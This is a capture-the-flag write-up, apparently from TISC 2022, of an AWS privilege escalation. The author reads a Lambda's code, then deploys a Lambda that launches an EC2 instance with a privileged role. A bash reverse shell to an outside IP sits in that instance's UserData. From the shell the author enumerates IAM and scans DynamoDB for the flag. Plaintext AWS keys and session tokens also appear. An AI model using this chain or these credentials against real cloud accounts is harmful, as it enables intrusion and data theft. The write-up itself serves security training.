{"ResponseMetadata": {"RequestId": "df15839d-bf36-4cf1-a6d0-6a6f8fea517e", "HTTPStatusCode": 200, "HTTPHeaders": {"date": "Fri, 09 Sep 2022 10:00:17 GMT", "content-type": "application/json", "content-length": "2848", "connection": "keep-alive", "x-amzn-requestid": "df15839d-bf36-4cf1-a6d0-6a6f8fea517e"}, "RetryAttempts": 0}, "Configuration": {"FunctionName": "cat-service", "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service", "Runtime": "python3.9", "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role", "Handler": "main.lambda_handler", "CodeSize": 416, "Description": "", "Timeout": 3, "MemorySize": 128, "LastModified": "2022-08-23T13:16:19.469+0000", "CodeSha256": "52UWd1KHAZub5aJIS953mHrKVM0mFPiVBuGahWFGaz4=", "Version": "$LATEST", "TracingConfig": {"Mode": "PassThrough"}, "RevisionId": "90be1b48-3339-4a78-a083-b77e285b7b8a", "State": "Active", "LastUpdateStatus": "Successful", "PackageType": "Zip"}, "Code": {"RepositoryType": "S3", "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgVPWDaYHJlMRuv68%2F2KU7CnITmi1VfjUFYA%2FNOKdyXJwCIGttcU4mQ3yG6heLPsf68OxVG%2Be%2B3XgadfsmNxjqHhtnKtsECEIQBBoMMjk1MzM4NzAzNTgzIgybdHXD%2BdW7I4bBzosquATyJkvl9EBzjY3gRW8PYnOx9Hx%2FhkP%2FtcoKs8V960UbbTm%2FvdM9uHGqRPQOymRA5rV8Mn4ab7kOLwmkoj8idhSYVqxmrmVQMw%2F38rknTmhjctVxiBTtySxajN1Lk3OcN%2FTNTPp084PwrztLu6J69MpcbtU5We0yUCR%2BimmbMQ3UZE1KrqMCMZf%2Ffw9PIuaUpb25wB58U%2BusFKNDESVGnasMuLCaSkoV4PQhvJbqTnt4Mj1QMLG25J5gyks5CejdxvWN5GEEFIZkAUkhXLO24IqBeNg3D28x7ndGmYDdtH93rdqichuColz0tZCjJHdVd2T2R3ympa54LVeqWi1p1pwF%2BIt%2BEd%2BOV3bsDFIR%2FOKcd8HQd9TvOtsh6mAijX0vzOMoIP0gZbzvOHHfrE1Cl4pLtw3kBWki5Zj72nea2%2FwLGYslN2Y1Wu1IDk1%2FuONb4%2FJxoxG2AbHJw7a0nTAWByfRp43K7641WZogJK9kiOG%2FIFaXkbR0gTFLngLGHz8GLjBoFyHDaklBChdB60OpejmYgZnCTPRIyBsSR7i3%2BPsydGzMI8QzsLD2W2qSWt2C6N0kWwqeyyzvu6EYio1l2YEmHtQa14y0U6Dz7wNFN0VLnKVvAgK22cktfZbm11bPG%2FAyjUKRcBqUVaZyBl6b9JgKGdKwevmJzYI%2FsAN5oxtDwvO%2FiRLFVeVV2XflxqVLw9wqPr%2BnF3yw%2FTzUdtbTadkGsDDfeGe8iX3TNnbcCpiTAB4VFKyk8sDHMOeI7JgGOqoB943K6qC1kUngqxMXWO%2BXUDiyHh15Q3jaJiWbtJpRrT08fxIT%2BWxZauF5fuL1NEEIOu%2FBMnbbvV5JfOys0RLJ87PcsZ%2B9K7gDECtZyLobJvtCbjyulcVgQQSdiiojrqDhWGFxrHKUmbddgLTfWpP0PR%2BWPVBrFzZ9m66avkdzCgoomtKHtVZCbEGl1nv9Sab6NytJhZufNEPB427FR%2FkAEQtgHXPaDmjNrX8%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220909T100017Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LP6M2EGZJY%2F20220909%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=6d5a839f51be92fcdb385485ae8cb64dd6b02fb8dd92fac6296b81ce1899024d"}}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$
```

View File

```bash
┌──(kali㉿kali)-[/tmp]
└─$ wget "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgVPWDaYHJlMRuv68%2F2KU7CnITmi1VfjUFYA%2FNOKdyXJwCIGttcU4mQ3yG6heLPsf68OxVG%2Be%2B3XgadfsmNxjqHhtnKtsECEIQBBoMMjk1MzM4NzAzNTgzIgybdHXD%2BdW7I4bBzosquATyJkvl9EBzjY3gRW8PYnOx9Hx%2FhkP%2FtcoKs8V960UbbTm%2FvdM9uHGqRPQOymRA5rV8Mn4ab7kOLwmkoj8idhSYVqxmrmVQMw%2F38rknTmhjctVxiBTtySxajN1Lk3OcN%2FTNTPp084PwrztLu6J69MpcbtU5We0yUCR%2BimmbMQ3UZE1KrqMCMZf%2Ffw9PIuaUpb25wB58U%2BusFKNDESVGnasMuLCaSkoV4PQhvJbqTnt4Mj1QMLG25J5gyks5CejdxvWN5GEEFIZkAUkhXLO24IqBeNg3D28x7ndGmYDdtH93rdqichuColz0tZCjJHdVd2T2R3ympa54LVeqWi1p1pwF%2BIt%2BEd%2BOV3bsDFIR%2FOKcd8HQd9TvOtsh6mAijX0vzOMoIP0gZbzvOHHfrE1Cl4pLtw3kBWki5Zj72nea2%2FwLGYslN2Y1Wu1IDk1%2FuONb4%2FJxoxG2AbHJw7a0nTAWByfRp43K7641WZogJK9kiOG%2FIFaXkbR0gTFLngLGHz8GLjBoFyHDaklBChdB60OpejmYgZnCTPRIyBsSR7i3%2BPsydGzMI8QzsLD2W2qSWt2C6N0kWwqeyyzvu6EYio1l2YEmHtQa14y0U6Dz7wNFN0VLnKVvAgK22cktfZbm11bPG%2FAyjUKRcBqUVaZyBl6b9JgKGdKwevmJzYI%2FsAN5oxtDwvO%2FiRLFVeVV2XflxqVLw9wqPr%2BnF3yw%2FTzUdtbTadkGsDDfeGe8iX3TNnbcCpiTAB4VFKyk8sDHMOeI7JgGOqoB943K6qC1kUngqxMXWO%2BXUDiyHh15Q3jaJiWbtJpRrT08fxIT%2BWxZauF5fuL1NEEIOu%2FBMnbbvV5JfOys0RLJ87PcsZ%2B9K7gDECtZyLobJvtCbjyulcVgQQSdiiojrqDhWGFxrHKUmbddgLTfWpP0PR%2BWPVBrFzZ9m66avkdzCgoomtKHtVZCbEGl1nv9Sab6NytJhZufNEPB427FR%2FkAEQtgHXPaDmjNrX8%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220909T100017Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LP6M2EGZJY%2F20220909%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=6d5a839f51be92fcdb385485ae8cb64dd6b02fb8dd92fac6296b81ce1899024d" -O special.zip
--2022-09-09 06:02:09--  https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgVPWDaYHJlMRuv68%2F2KU7CnITmi1VfjUFYA%2FNOKdyXJwCIGttcU4mQ3yG6heLPsf68OxVG%2Be%2B3XgadfsmNxjqHhtnKtsECEIQBBoMMjk1MzM4NzAzNTgzIgybdHXD%2BdW7I4bBzosquATyJkvl9EBzjY3gRW8PYnOx9Hx%2FhkP%2FtcoKs8V960UbbTm%2FvdM9uHGqRPQOymRA5rV8Mn4ab7kOLwmkoj8idhSYVqxmrmVQMw%2F38rknTmhjctVxiBTtySxajN1Lk3OcN%2FTNTPp084PwrztLu6J69MpcbtU5We0yUCR%2BimmbMQ3UZE1KrqMCMZf%2Ffw9PIuaUpb25wB58U%2BusFKNDESVGnasMuLCaSkoV4PQhvJbqTnt4Mj1QMLG25J5gyks5CejdxvWN5GEEFIZkAUkhXLO24IqBeNg3D28x7ndGmYDdtH93rdqichuColz0tZCjJHdVd2T2R3ympa54LVeqWi1p1pwF%2BIt%2BEd%2BOV3bsDFIR%2FOKcd8HQd9TvOtsh6mAijX0vzOMoIP0gZbzvOHHfrE1Cl4pLtw3kBWki5Zj72nea2%2FwLGYslN2Y1Wu1IDk1%2FuONb4%2FJxoxG2AbHJw7a0nTAWByfRp43K7641WZogJK9kiOG%2FIFaXkbR0gTFLngLGHz8GLjBoFyHDaklBChdB60OpejmYgZnCTPRIyBsSR7i3%2BPsydGzMI8QzsLD2W2qSWt2C6N0kWwqeyyzvu6EYio1l2YEmHtQa14y0U6Dz7wNFN0VLnKVvAgK22cktfZbm11bPG%2FAyjUKRcBqUVaZyBl6b9JgKGdKwevmJzYI%2FsAN5oxtDwvO%2FiRLFVeVV2XflxqVLw9wqPr%2BnF3yw%2FTzUdtbTadkGsDDfeGe8iX3TNnbcCpiTAB4VFKyk8sDHMOeI7JgGOqoB943K6qC1kUngqxMXWO%2BXUDiyHh15Q3jaJiWbtJpRrT08fxIT%2BWxZauF5fuL1NEEIOu%2FBMnbbvV5JfOys0RLJ87PcsZ%2B9K7gDECtZyLobJvtCbjyulcVgQQSdiiojrqDhWGFxrHKUmbddgLTfWpP0PR%2BWPVBrFzZ9m66avkdzCgoomtKHtVZCbEGl1nv9Sab6NytJhZufNEPB427FR%2FkAEQtgHXPaDmjNrX8%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220909T100017Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LP6M2EGZJY%2F20220909%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=6d5a839f51be92fcdb385485ae8cb64dd6b02fb8dd92fac6296b81ce1899024d
Resolving awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com (awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com)... 52.219.37.35
Connecting to awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com (awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com)|52.219.37.35|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 416 [application/zip]
Saving to: ‘special.zip’

special.zip                               100%[=====================================================================================>]     416  --.-KB/s    in 0.001s  

2022-09-09 06:02:09 (635 KB/s) - ‘special.zip’ saved [416/416]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ dtrx special.zip        
special.zip contains one file but its name doesn't match.
 Expected: special
   Actual: main.py
You can:
 * extract the file _I_nside a new directory named special
 * extract the file and _R_ename it special
 * extract the file _H_ere
What do you want to do?  (I/r/h) 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd special 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/special]
└─$ ls
main.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/special]
└─$ cat main.py                        
import boto3

def lambda_handler(event, context):
    
    # Work in Progress: Requires help from Agents! 
    
    # ec2 = boto3.resource('ec2')

    # instances = ec2.create_instances(
    #    ImageId="???",
    #    MinCount=1,
    #    MaxCount=1,
    #    InstanceType="t2.micro"
    #)
    
    return {
        'status': 200,
        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3'
    }
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/special]
└─$ 
```

## AWS EC2

### Lambda Privesc to EC2 agent role

Find random Amazon Machine Image. Make sure to find one from the specific region

![](Pasted%20image%2020220909181736.png)

https://stackoverflow.com/questions/57001004/unable-to-create-an-ec2-instance-using-boto3

lambda_function.py
```python
import boto3

REGION_NAME="ap-southeast-1"
def lambda_handler(event, context):
    ec2 = boto3.resource('ec2', region_name=REGION_NAME)

    instances = ec2.create_instances(
       ImageId="ami-0b89f7b3f054b957e", # Found on AWS Portal
       MinCount=1,
       MaxCount=1,
       InstanceType="t2.micro"
    )
    return instances["Instances"][0]["InstanceId"]
```

```bash
$ ./run.sh
...
{"errorMessage": "An error occurred (VPCIdNotSpecified) when calling the RunInstances operation: No default VPC for this user. GroupName is only supported for EC2-Classic and default VPC.", "errorType": "ClientError", "stackTrace": ["  File \"/var/task/lambda_function.py\", line 11, in lambda_handler\n    InstanceType=\"t2.micro\"\n", "  File \"/var/task/boto3/resources/factory.py\", line 520, in do_action\n    response = action(self, *args, **kwargs)\n", "  File \"/var/task/boto3/resources/action.py\", line 83, in __call__\n    response = getattr(parent.meta.client, operation_name)(*args, **params)\n", "  File \"/var/task/botocore/client.py\", line 386, in _api_call\n    return self._make_api_call(operation_name, kwargs)\n", "  File \"/var/task/botocore/client.py\", line 705, in _make_api_call\n    raise error_class(parsed_response, operation_name)\n"]}       
```

https://www.edureka.co/community/36578/pass-while-creating-the-ec2-instance-aws-using-python-boto3

## Lambda Function

Create a reverse shell to ngrok

`lambda_function.py`

```python
import boto3

# https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
USERNAME="user-95abe82de2174edb98135e48ef896bbd"
SCRIPT=f"""#!/bin/bash
/bin/bash -i >& /dev/tcp/18.141.129.246/16058 0>&1
"""

ROLE="arn:aws:iam::051751498533:role/ec2_agent_role"
REGION_NAME="ap-southeast-1"
def lambda_handler(event, context):
    ec2 = boto3.resource('ec2', region_name=REGION_NAME)

    # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.ServiceResource.create_instances
    # https://codeflex.co/boto3-create-ec2-with-tags/
    instances = ec2.create_instances(
        ImageId="ami-0b89f7b3f054b957e", # Found on AWS Portal
        MinCount=1,
        MaxCount=1,
        InstanceType="t2.micro",
        SubnetId = 'subnet-0aa6ecdf900166741', 
        IamInstanceProfile={
            'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
        },
        TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [
                    {
                        'Key': 'agent',
                        'Value': USERNAME
                    },
                ]
            }
        ],
        UserData=SCRIPT
    )
    instance = instances[0]
    return (instance.id, instance.private_ip_address)
    
#lambda_handler(None, None)
```

`./run.sh`

```bash
#https://linuxhint.com/generate-random-string-bash/
LAMBDA_FUNC=user-95abe82de2174edb98135e48ef896bbd-ec2run-$(openssl rand -hex 5)

pip install --target ./package boto3
cd package
zip -r ../function.zip . > /dev/null
cd ..
zip -g function.zip lambda_function.py
rm -rf package

aws lambda create-function --zip-file fileb://function.zip --runtime python3.7 --handler lambda_function.lambda_handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name $LAMBDA_FUNC --timeout 60
aws lambda invoke --function-name $LAMBDA_FUNC /tmp/out.txt
cat /tmp/out.txt
```

## UserData Final Exploit

```bash
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ ./run.sh
updating: lambda_function.py (deflated 48%)
{
    "FunctionName": "user-95abe82de2174edb98135e48ef896bbd-ec2run-e9bf31c3b2",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-95abe82de2174edb98135e48ef896bbd-ec2run-e9bf31c3b2",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 9332416,
    "Description": "",
    "Timeout": 60,
    "MemorySize": 128,
    "LastModified": "2022-09-09T13:17:26.523+0000",
    "CodeSha256": "zf3I7mXTzYZpEjT3J42YJG5IkSRrjla3zq4gDHOXdmM=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "90d3e86c-ef09-46ba-8bcf-d016c6aa5a97",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
["i-0647f6b14ee6acc28", "10.0.58.178"]                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ 
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35990
bash: no job control in this shell
[root@ip-10-0-58-178 /]# 
```

## AWS DynamoDB

### Role Information

```bash
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-role-policies --role-name "ec2_agent_role"   
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_ec2_agent_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy --policy-arn "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"                       
{
    "Policy": {
        "PolicyName": "iam_policy_for_ec2_agent_role",
        "PolicyId": "ANPAQYDFBGMSUUGDZFFBM",
        "Arn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "AWS IAM Policy for EC2 agent node",
        "CreateDate": "2022-07-22T09:29:34+00:00",
        "UpdateDate": "2022-07-22T09:29:34+00:00",
        "Tags": []
    }
}
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role" --version-id "v1"
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "dynamodb:DescribeTable",
                        "dynamodb:ListTables",
                        "dynamodb:Scan",
                        "dynamodb:Query"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "VisualEditor0"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-07-22T09:29:34+00:00"
    }
}
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```


## AWS DynamoDB

```bash
[root@ip-10-0-47-186 /]# aws dynamodb list-tables --region ap-southeast-1
aws dynamodb list-tables --region ap-southeast-1
{
    "TableNames": [
        "flag_db"
    ]
}
[root@ip-10-0-47-186 /]# aws dynamodb scan --table-name flag_db --region ap-southeast-1                
{
    "Count": 1, 
    "Items": [
        {
            "secret": {
                "S": "TISC{iT3_N0t_s0_C1oUdy}"
            }, 
            "name": {
                "S": "flag"
            }
        }
    ], 
    "ScannedCount": 1, 
    "ConsumedCapacity": null
}
[root@ip-10-0-47-186 /]#     
```

# Flag

`TISC{iT3_N0t_s0_C1oUdy}`

# Others

Route Tables

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-route-tables                                                                                                                                 254 ⨯
{
    "RouteTables": [
        {
            "Associations": [
                {
                    "Main": false,
                    "RouteTableAssociationId": "rtbassoc-008d1bc16737a4873",
                    "RouteTableId": "rtb-0cc80fc5af7c8470c",
                    "SubnetId": "subnet-0aa6ecdf900166741",
                    "AssociationState": {
                        "State": "associated"
                    }
                }
            ],
            "PropagatingVgws": [],
            "RouteTableId": "rtb-0cc80fc5af7c8470c",
            "Routes": [
                {
                    "DestinationCidrBlock": "10.0.0.0/16",
                    "GatewayId": "local",
                    "Origin": "CreateRouteTable",
                    "State": "active"
                },
                {
                    "DestinationCidrBlock": "0.0.0.0/0",
                    "GatewayId": "igw-03460d3a3a232502d",
                    "Origin": "CreateRoute",
                    "State": "active"
                }
            ],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
{
    "RouteTables": [
        {
            "Associations": [
                {
                    "Main": false,
                    "RouteTableAssociationId": "rtbassoc-008d1bc16737a4873",
                    "RouteTableId": "rtb-0cc80fc5af7c8470c",
                    "SubnetId": "subnet-0aa6ecdf900166741",
                    "AssociationState": {
                        "State": "associated"
                    }
                }
            ],
            "PropagatingVgws": [],
            "RouteTableId": "rtb-0cc80fc5af7c8470c",
            "Routes": [
                {
                    "DestinationCidrBlock": "10.0.0.0/16",
                    "GatewayId": "local",
                    "Origin": "CreateRouteTable",
                    "State": "active"
                },
                {
                    "DestinationCidrBlock": "0.0.0.0/0",
                    "GatewayId": "igw-03460d3a3a232502d",
                    "Origin": "CreateRoute",
                    "State": "active"
                }
            ],
            "Tags": [
                {
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-vpcs        
{
    "Vpcs": [
        {
            "CidrBlock": "10.0.0.0/16",
            "DhcpOptionsId": "dopt-05dfce395f9d4f9bf",
            "State": "available",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "InstanceTenancy": "default",
            "CidrBlockAssociationSet": [
                {
                    "AssociationId": "vpc-cidr-assoc-020cb5d96555b92ff",
                    "CidrBlock": "10.0.0.0/16",
                    "CidrBlockState": {
                        "State": "associated"
                    }
                }
            ],
            "IsDefault": false,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ]
        }
    ]
}
```

Regions 

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-regions     
{
    "Regions": [
        {
            "Endpoint": "ec2.eu-north-1.amazonaws.com",
            "RegionName": "eu-north-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-south-1.amazonaws.com",
            "RegionName": "ap-south-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.eu-west-3.amazonaws.com",
            "RegionName": "eu-west-3",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.eu-west-2.amazonaws.com",
            "RegionName": "eu-west-2",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.eu-west-1.amazonaws.com",
            "RegionName": "eu-west-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-northeast-3.amazonaws.com",
            "RegionName": "ap-northeast-3",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-northeast-2.amazonaws.com",
            "RegionName": "ap-northeast-2",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-northeast-1.amazonaws.com",
            "RegionName": "ap-northeast-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.sa-east-1.amazonaws.com",
            "RegionName": "sa-east-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ca-central-1.amazonaws.com",
            "RegionName": "ca-central-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-southeast-1.amazonaws.com",
            "RegionName": "ap-southeast-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.ap-southeast-2.amazonaws.com",
            "RegionName": "ap-southeast-2",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.eu-central-1.amazonaws.com",
            "RegionName": "eu-central-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.us-east-1.amazonaws.com",
            "RegionName": "us-east-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.us-east-2.amazonaws.com",
            "RegionName": "us-east-2",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.us-west-1.amazonaws.com",
            "RegionName": "us-west-1",
            "OptInStatus": "opt-in-not-required"
        },
        {
            "Endpoint": "ec2.us-west-2.amazonaws.com",
            "RegionName": "us-west-2",
            "OptInStatus": "opt-in-not-required"
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-subnets
{
{
    "Subnets": [
        {
            "AvailabilityZone": "ap-southeast-1a",
            "AvailabilityZoneId": "apse1-az2",
            "AvailableIpAddressCount": 16378,
            "CidrBlock": "10.0.0.0/18",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ],
            "SubnetArn": "arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-security-groups
{
{
    "SecurityGroups": [
        {
            "Description": "Access to c2 infra",
            "GroupName": "default-agents-sg",
            "IpPermissions": [
                {
                    "FromPort": 0,
                    "IpProtocol": "tcp",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 65535,
                    "UserIdGroupPairs": []
                }
            ],
            "OwnerId": "051751498533",
            "GroupId": "sg-047c958320ee832f0",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-095cd9241e386169d"
        },
        {
            "Description": "default VPC security group",
            "GroupName": "default",
            "IpPermissions": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": [
                        {
                            "GroupId": "sg-0521a956628208ccc",
                            "UserId": "051751498533"
                        }
                    ]
                }
            ],
            "OwnerId": "051751498533",
            "GroupId": "sg-0521a956628208ccc",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-095cd9241e386169d"
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws configure                   
AWS Access Key ID [****************522K]: 
AWS Secret Access Key [****************nMaj]: 
Default region name [ap-southeast-1]: ^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws configure                                                                                                                                                 130 ⨯
AWS Access Key ID [****************522K]: AKIAQYDFBGMSUFX5522K
AWS Secret Access Key [****************nMaj]: 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
Default region name [ap-southeast-1]: us-east-1
Default output format [None]: 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws sts get-session-token
{
    "Credentials": {
        "AccessKeyId": "ASIAQYDFBGMSV5MNZQ5N",
        "SecretAccessKey": "8kKXd98c7freukaucYviHvuJPRywd8ZU9yoxTQ3I",
        "SessionToken": "IQoJb3JpZ2luX2VjEJf//////////wEaCXVzLWVhc3QtMSJHMEUCIDBtti9kerPhbBxdgXA2WOTcqfpvdSHevTiBt6cyWj2bAiEA8a7KlA+nEgm9RM6kzxSu0774qzm4BUsmBKLU+BubXIsq6wEIMBABGgwwNTE3NTE0OTg1MzMiDKj4F6d7vveEfoo2YSrIAUOB3yGWuqfJleOrfk/X6avqvH5aF+MjHJlC2GFgmr26SarVpdaNg42ESx/SMV+Fp+DvWTYYpNrm5pPLdr/6g6JYltPJLeK2Uy9b/VHzbF0pdG/lh3Y3M7yJoEK8VI7dhKK9ff/MQ9s6GcyIby3mVcSZeKnhSfHn30BT4myKaHz3UEPMfoMsC47SOVxev6AuZx2eFZxlykVDBVquDVUP2ZfJJgRjb+dUijx2/FA+vqj/wGHLeW7mqppJy/mZwihHBNffxgwSrdxGMNH855gGOpgBF2nhoVON0BKhdxnxfWZ6qw9r7l615V+abHX0TXgPjtBsmx8vh+goPG0HxGxshAA9xhKdk8HYcDb8tp8m2dw5aPNPdTKcYpr27SRSLfGc13yxoMA5HHyWqNOWkEApCDYLObLv7nNMhs0UJokCvj898HUT6rwE6wJk++GX0jw2i/OU2oZRY5N4c3/hBbHuGV98dRzhkQ14JTM=",
        "Expiration": "2022-09-09T02:38:09+00:00"
    }
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAQYDFBGMS5DINIMWUT",
    "Account": "051751498533",
    "Arn": "arn:aws:iam::051751498533:user/user-b464a9d644194b0dafc3d166d36d5c4e"
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws iam list-roles         
{
    "Roles": [
        {
            "Path": "/service-role/",
            "RoleName": "AWSBackupDefaultServiceRole",
            "RoleId": "AROAQYDFBGMSZL3H3GO7H",
            "Arn": "arn:aws:iam::051751498533:role/service-role/AWSBackupDefaultServiceRole",
